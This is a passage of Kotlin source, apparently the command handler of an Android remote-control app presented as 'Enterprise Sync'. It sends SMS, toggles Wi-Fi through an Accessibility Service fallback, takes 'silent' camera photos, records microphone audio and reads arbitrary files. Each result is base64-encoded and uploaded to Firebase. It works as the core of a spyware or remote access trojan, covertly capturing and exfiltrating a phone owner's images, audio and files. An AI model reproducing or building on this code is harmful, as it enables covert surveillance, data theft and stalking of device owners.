        val simState = telephonyManager?.simState ?: TelephonyManager.SIM_STATE_UNKNOWN
        if (simState == TelephonyManager.SIM_STATE_ABSENT && activeSubId == SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
            throw IllegalStateException("No active SIM card detected on this device. An active SIM card with cellular network service is required to send SMS.")
        }

        val smsManager: SmsManager = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val sysSmsManager = context.getSystemService(SmsManager::class.java)
                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID && sysSmsManager != null) {
                    sysSmsManager.createForSubscriptionId(activeSubId)
                } else {
                    sysSmsManager ?: @Suppress("DEPRECATION") SmsManager.getDefault()
                }
            } else {
                @Suppress("DEPRECATION")
                if (activeSubId != SubscriptionManager.INVALID_SUBSCRIPTION_ID) {
                    SmsManager.getSmsManagerForSubscriptionId(activeSubId)
                } else {
                    SmsManager.getDefault()
                }
            }
        } catch (_: Exception) {
            @Suppress("DEPRECATION")
            SmsManager.getDefault()
        }

        val actionSent = "com.example.SMS_SENT_${System.currentTimeMillis()}"
        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }

        val sentIntent = PendingIntent.getBroadcast(
            context,
            0,
            Intent(actionSent).apply { setPackage(context.packageName) },
            pendingFlags
        )

        val latch = java.util.concurrent.CountDownLatch(1)
        var resultCode = Activity.RESULT_CANCELED
        var failureReason = ""

        val smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                val code = getResultCode()
                resultCode = code
                when (code) {
                    Activity.RESULT_OK -> {
                        failureReason = ""
                    }
                    SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                        failureReason = "Generic failure (Carrier network error, insufficient mobile balance, or invalid number format)."
                    }
                    SmsManager.RESULT_ERROR_NO_SERVICE -> {
                        failureReason = "No cellular network service or signal available."
                    }
                    SmsManager.RESULT_ERROR_NULL_PDU -> {
                        failureReason = "Null PDU error."
                    }
                    SmsManager.RESULT_ERROR_RADIO_OFF -> {
                        failureReason = "Cellular radio is OFF (Airplane mode enabled)."
                    }
                    else -> {
                        failureReason = "Carrier dispatch error code: $code."
                    }
                }
                latch.countDown()
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(smsReceiver, IntentFilter(actionSent), Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(smsReceiver, IntentFilter(actionSent))
        }

        try {
            val parts = smsManager.divideMessage(text)
            if (parts.size > 1) {
                val sentIntents = ArrayList<PendingIntent>()
                for (i in parts.indices) {
                    sentIntents.add(sentIntent)
                }
                smsManager.sendMultipartTextMessage(cleanRecipient, null, parts, sentIntents, null)
            } else {
                smsManager.sendTextMessage(cleanRecipient, null, text, sentIntent, null)
            }

            val confirmed = latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            if (confirmed && resultCode != Activity.RESULT_OK) {
                throw Exception("SMS dispatch failed: $failureReason")
            }
        } finally {
            try {
                context.unregisterReceiver(smsReceiver)
            } catch (_: Exception) {}
        }
    }

    private fun handleWifiCommand(commandType: String, payload: String): String {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            ?: throw IllegalStateException("Wi-Fi Manager service unavailable.")

        val isCurrentlyEnabled = wifiManager.isWifiEnabled
        val targetState = when (commandType.uppercase()) {
            "WIFI_ON", "ENABLE_WIFI" -> true
            "WIFI_OFF", "DISABLE_WIFI" -> false
            else -> {
                val p = payload.trim().lowercase()
                if (p == "true" || p == "on" || p == "1") true
                else if (p == "false" || p == "off" || p == "0") false
                else !isCurrentlyEnabled
            }
        }

        var success = false
        try {
            @Suppress("DEPRECATION")
            success = wifiManager.setWifiEnabled(targetState)
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "setWifiEnabled exception: ${e.message}")
        }

        if (!success && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val accOpened = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
            val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
            return if (accOpened) {
                "Wi-Fi toggle command ($targetState) issued. On Android 10+, opened Quick Settings panel via Accessibility Service. Current Wi-Fi state: $currentStateStr"
            } else {
                "Wi-Fi toggle restricted on Android 10+ (Current Wi-Fi: $currentStateStr). Note: Accessibility Service is OFF - enable Enterprise Sync in Settings -> Accessibility for automatic Quick Settings fallback."
            }
        }

        val currentStateStr = if (wifiManager.isWifiEnabled) "ON" else "OFF"
        return "Wi-Fi toggled successfully. Current Wi-Fi state: $currentStateStr"
    }

    private suspend fun captureSilentCameraSnap(payload: String): String = withContext(Dispatchers.IO) {
        val hasCamPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        if (!hasCamPermission) {
            throw IllegalStateException("Camera permission (android.permission.CAMERA) not granted.")
        }

        var requestedFacing = "back"
        val trimmed = payload.trim()
        if (trimmed.contains("front", ignoreCase = true)) {
            requestedFacing = "front"
        } else if (trimmed.startsWith("{")) {
            try {
                val json = JSONObject(trimmed)
                val camStr = json.optString("camera", json.optString("facing", "back")).lowercase()
                if (camStr == "front") requestedFacing = "front"
            } catch (_: Exception) {}
        }

        val cameraHelper = CameraHelper(context)
        try {
            val cameraId = cameraHelper.getCameraId(requestedFacing)
            val base64Data = cameraHelper.takePhoto(cameraId) ?: throw Exception("Camera capture failed")
            
            val base64Content = base64Data.substringAfter(",")
            val bytes = Base64.decode(base64Content, Base64.NO_WRAP)

            val nowMs = System.currentTimeMillis()
            val deviceId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }

            val facingName = if (requestedFacing == "front") "Front" else "Rear/Back"
            val photoData = mapOf(
                "timestamp" to nowMs,
                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                "cameraFacing" to facingName,
                "fileSizeBytes" to bytes.size,
                "photoBase64" to base64Data
            )

            try {
                val rtdb = FirebaseDatabase.getInstance()
                rtdb.getReference("devices/$deviceId/camera_snaps/$nowMs").setValue(photoData)
                rtdb.getReference("devices/$deviceId/camera_latest").setValue(photoData)
            } catch (e: Exception) {
                Log.e("RemoteCommandManager", "Failed to upload camera snap to RTDB: ${e.message}")
            }

            "Captured silent $facingName camera photo (${(bytes.size / 1024)} KB). Uploaded to Cloud."
        } finally {
            cameraHelper.cleanup()
        }
    }

    private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
        val hasRecordPermission = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        if (!hasRecordPermission) {
            throw IllegalStateException("Microphone recording permission (android.permission.RECORD_AUDIO) not granted.")
        }

        var durationSec = 10
        val trimmed = payload.trim()
        if (trimmed.startsWith("{")) {
            try {
                val json = JSONObject(trimmed)
                val keys = listOf("durationSec", "duration_sec", "duration", "seconds", "durationSeconds", "sec", "length", "time")
                for (key in keys) {
                    if (json.has(key)) {
                        val d = json.optInt(key, 0)
                        if (d > 0) {
                            durationSec = d
                            break
                        }
                    }
                }
            } catch (_: Exception) {}
        } else if (trimmed.contains("=")) {
            val valPart = trimmed.substringAfter("=").trim().filter { it.isDigit() }
            val parsed = valPart.toIntOrNull()
            if (parsed != null && parsed > 0) durationSec = parsed
        } else {
            val parsed = trimmed.filter { it.isDigit() }.toIntOrNull()
            if (parsed != null && parsed > 0) {
                durationSec = parsed
            }
        }
        val finalDuration = durationSec.coerceIn(3, 60)

        val audioHelper = AudioRecorderHelper(context)
        try {
            val base64Data = audioHelper.startRecording(finalDuration) ?: throw Exception("Audio recording failed")
            val base64Content = base64Data.substringAfter(",")
            val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)

            val nowMs = System.currentTimeMillis()
            val deviceId = try {
                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
            } catch (_: Exception) { "DEVICE_${Build.MODEL}" }

            val recData = mapOf(
                "timestamp" to nowMs,
                "formattedTime" to SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs)),
                "durationSeconds" to finalDuration,
                "fileSizeBytes" to audioBytes.size,
                "audioBase64" to base64Data
            )

            try {
                val rtdb = FirebaseDatabase.getInstance()
                rtdb.getReference("devices/$deviceId/audio_recordings/$nowMs").setValue(recData)
                rtdb.getReference("devices/$deviceId/audio_latest").setValue(recData)
            } catch (e: Exception) {
                Log.e("RemoteCommandManager", "Failed to upload audio recording to RTDB: ${e.message}")
            }

            "Recorded $finalDuration seconds audio (${(audioBytes.size / 1024)} KB). Uploaded to Cloud."
        } finally {
            audioHelper.cleanup()
        }
    }

    private fun extractFilePathOrUri(payload: String): String {
        val trimmed = payload.trim()
        if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
            try {
                val json = JSONObject(trimmed)
                val path = json.optString("path").ifEmpty {
                    json.optString("filePath").ifEmpty {
                        json.optString("file_path").ifEmpty {
                            json.optString("uri").ifEmpty {
                                json.optString("file").ifEmpty {
                                    json.optString("url")
                                }
                            }
                        }
                    }
                }
                if (path.isNotEmpty()) return path
            } catch (_: Exception) {}
        }
        return trimmed
    }

    private fun readFileData(pathOrUri: String): Pair<String, ByteArray> {
        val uriStr = pathOrUri.trim()
        if (uriStr.startsWith("content://") || uriStr.startsWith("file://")) {
            val uri = Uri.parse(uriStr)
            val inputStream = context.contentResolver.openInputStream(uri)
                ?: throw IllegalArgumentException("Cannot open content URI stream for '$pathOrUri'")
            val bytes = inputStream.use { it.readBytes() }
            var fileName = uri.lastPathSegment ?: "file_${System.currentTimeMillis()}"
            try {
                context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
                    val nameIdx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
                    if (nameIdx >= 0 && cursor.moveToFirst()) {
                        val name = cursor.getString(nameIdx)
                        if (!name.isNullOrBlank()) fileName = name
                    }
                }
            } catch (_: Exception) {}
            return Pair(fileName, bytes)
        } else {
            val file = File(uriStr)
            if (!file.exists()) {
                throw java.io.FileNotFoundException("File does not exist at path: '$pathOrUri'")
            }
            if (!file.canRead()) {
                throw IllegalStateException("File exists but cannot be read at path: '$pathOrUri'")
            }
            val bytes = file.readBytes()
            return Pair(file.name, bytes)
        }
    }

    private suspend fun executeReadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
        val pathOrUri = extractFilePathOrUri(payload)
        if (pathOrUri.isEmpty()) {
            throw IllegalArgumentException("READ_FILE command requires a non-empty file path or URI payload.")
        }
        val (fileName, bytes) = readFileData(pathOrUri)
        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)

        val deviceId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }

        val nowMs = System.currentTimeMillis()
        val rtdbData = mapOf(
            "fileName" to fileName,
            "filePath" to pathOrUri,
            "fileSizeBytes" to bytes.size,
            "timestamp" to nowMs,
            "base64" to base64Content
        )

        try {
            val rtdb = FirebaseDatabase.getInstance()
            rtdb.getReference("devices/$deviceId/file_reads/$nowMs").setValue(rtdbData)
            rtdb.getReference("devices/$deviceId/file_read_latest").setValue(rtdbData)
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Failed to upload READ_FILE result to RTDB: ${e.message}")
        }

        base64Content
    }

    private suspend fun executeDownloadFileCommand(payload: String): String = withContext(Dispatchers.IO) {
        val pathOrUri = extractFilePathOrUri(payload)
        if (pathOrUri.isEmpty()) {
            throw IllegalArgumentException("DOWNLOAD_FILE command requires a non-empty file path or URI payload.")
        }
        val (fileName, bytes) = readFileData(pathOrUri)
        val base64Content = Base64.encodeToString(bytes, Base64.NO_WRAP)

        val deviceId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEVICE_${Build.MODEL}"
        } catch (_: Exception) { "DEVICE_${Build.MODEL}" }

        val nowMs = System.currentTimeMillis()
        val formattedTime = SimpleDateFormat("MMM dd, yyyy, hh:mm:ss a", Locale.US).format(Date(nowMs))
        val kb = bytes.size / 1024.0
        val formattedSize = if (kb >= 1024) String.format(Locale.US, "%.2f MB", kb / 1024.0) else String.format(Locale.US, "%.1f KB", kb)

        val downloadData = mapOf(
            "id" to nowMs.toString(),
            "fileName" to fileName,
            "filePath" to pathOrUri,
            "fileSizeBytes" to bytes.size,
            "formattedSize" to formattedSize,
            "timestamp" to nowMs,
            "formattedTime" to formattedTime,
            "fileBase64" to "data:application/octet-stream;base64,$base64Content",
            "downloadUrl" to "data:application/octet-stream;base64,$base64Content"
        )

        try {
            val rtdb = FirebaseDatabase.getInstance()
            rtdb.getReference("devices/$deviceId/downloads/$nowMs").setValue(downloadData)
            rtdb.getReference("devices/$deviceId/file_downloads/$nowMs").setValue(downloadData)
            rtdb.getReference("devices/$deviceId/file_downloads_latest").setValue(downloadData)
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to RTDB: ${e.message}")
        }

        try {
            val firestore = FirebaseFirestore.getInstance()
            firestore.collection("enterprise_devices")
                .document(deviceId)
                .collection("downloads")
                .document(nowMs.toString())
                .set(downloadData)
        } catch (e: Exception) {
            Log.e("RemoteCommandManager", "Failed to upload DOWNLOAD_FILE to Firestore: ${e.message}")
        }

        "File '$fileName' ($formattedSize) downloaded and uploaded to cloud storage successfully. Available at devices/$deviceId/downloads/$nowMs."
    }
}
